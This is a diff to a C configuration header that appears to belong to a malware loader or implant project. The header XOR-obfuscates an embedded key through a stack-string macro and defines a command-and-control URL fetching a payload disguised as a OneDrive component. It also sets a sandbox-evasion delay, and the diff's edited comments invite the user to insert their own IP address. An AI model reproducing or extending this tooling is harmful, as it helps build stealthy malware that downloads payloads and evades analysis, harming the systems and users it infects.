@@ -1,8 +1,8 @@
 #ifndef CONFIG_H
 #define CONFIG_H
 
-// macro generated for key: '_sup3s3cr3tk3y_'
-// NOTE: use /helper/stack_string.py to generate macro for your own key
+// macro generated for default key: '_sup3s3cr3tk3y_'
+// NOTE: put your key macro here - use /tools/stack_string.py to generate the macro
 #define LOAD_GLOBAL_KEY(key_var, len_var) \
     char key_var[16]; \
     key_var[0] = 0xBA ^ 0xE5; \
@@ -24,6 +24,7 @@
     size_t len_var = 15;
 
 // TODO: encode C2 URL
+// NOTE: put your IP address here
 #define C2_URL "http://192.168.122.235:8080/OneDrive_Component.bin"
 
 #define SANDBOX_DELAY_CYCLES 500000000
